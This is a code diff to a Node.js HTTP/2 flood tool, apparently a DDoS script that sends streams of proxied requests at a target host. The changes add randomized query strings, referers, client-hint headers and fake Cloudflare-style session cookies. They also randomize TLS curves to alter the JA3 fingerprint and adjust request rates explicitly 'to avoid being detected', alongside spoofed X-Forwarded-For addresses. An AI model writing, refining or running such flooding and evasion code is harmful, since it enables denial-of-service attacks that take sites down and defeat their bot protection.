@@ -89,6 +89,7 @@ const cache_control = ["no-cache", "max-age=0"];
 const referers = [
     `https://${parsedTarget.host}/`,
     `https://${parsedTarget.host}${parsedTarget.path}`,
+    `https://${parsedTarget.host}/search?q=${randstr(6)}`,
     "https://www.google.com/",
     "https://www.bing.com/",
     ""
@@ -176,7 +177,8 @@ function generateDynamicPath() {
         `id=${randomIntn(1000, 9999)}`,
         `page=${randomIntn(1, 20)}`,
         `token=${randstr(10)}`,
-        `lang=${randomElement(['en', 'vi', 'zh', 'fr'])}`
+        `lang=${randomElement(['en', 'vi', 'zh', 'fr'])}`,
+        `category=${randstr(5)}`
     ];
     const queryCount = randomIntn(1, 3);
     return `${basePath}?${queries.slice(0, queryCount).join('&')}`;
@@ -184,7 +186,7 @@ function generateDynamicPath() {
 
 function generateDynamicHeaders() {
     const uaIndex = randomIntn(0, userAgents.length);
-    return {
+    const headers = {
         ":method": "GET",
         ":authority": parsedTarget.host,
         ":path": generateDynamicPath(),
@@ -204,8 +206,15 @@ function generateDynamicHeaders() {
         "priority": randomElement(["u=0, i", "u=1"]),
         "cache-control": randomElement(cache_control),
         "referer": randomElement(referers),
-        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`
+        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`,
+        "sec-ch-prefers-color-scheme": randomElement(["light", "dark"]),
+        "sec-ch-viewport-width": randomIntn(800, 1920).toString()
     };
+    // Thêm cookie ngẫu nhiên để mô phỏng phiên người dùng
+    if (Math.random() > 0.5) {
+        headers["cookie"] = `__cfduid=${randstr(32)}; session=${randstr(16)}`;
+    }
+    return headers;
 }
 
 function runFlooder() {
@@ -217,7 +226,7 @@ function runFlooder() {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 10
+        timeout: 15 // Tăng timeout để xử lý proxy chậm
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
@@ -235,7 +244,7 @@ function runFlooder() {
             rejectUnauthorized: false,
             minVersion: 'TLSv1.2',
             maxVersion: 'TLSv1.3',
-            ecdhCurve: 'auto'
+            ecdhCurve: randomElement(['X25519', 'prime256v1', 'secp384r1']) // Ngẫu nhiên hóa curve để cải thiện JA3
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
@@ -245,7 +254,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 30, // Tăng lên 30 để xử lý nhiều request hơn
+                maxConcurrentStreams: 25, // Giảm xuống 25 để tránh bị phát hiện
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536
             },
@@ -255,7 +264,7 @@ function runFlooder() {
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 const dynHeaders = generateDynamicHeaders();
-                for (let i = 0; i < Math.min(args.Rate, 15); i++) { // Tăng giới hạn lên 15
+                for (let i = 0; i < Math.min(args.Rate, 12); i++) { // Giảm xuống 12 request mỗi chu kỳ
                     const request = client.request(dynHeaders);
                     request.on("response", () => {
                         request.close();
@@ -267,7 +276,7 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 100); // Giảm xuống 100ms để tăng tốc độ
+            }, 150); // Tăng lên 150ms để giảm áp lực
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
